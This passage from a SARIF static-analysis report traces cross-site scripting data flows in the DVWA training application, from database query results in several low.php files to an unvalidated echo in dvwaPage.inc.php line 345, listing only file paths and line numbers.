                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:13 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 13
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:17 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 17
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $avatar"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:22 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 22
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4521",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "643930933CB339199CBD242CD193DB96"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:11 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - mysqli_fetch_assoc(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:16 - Assignment to $first"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 16
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:20 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 20
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
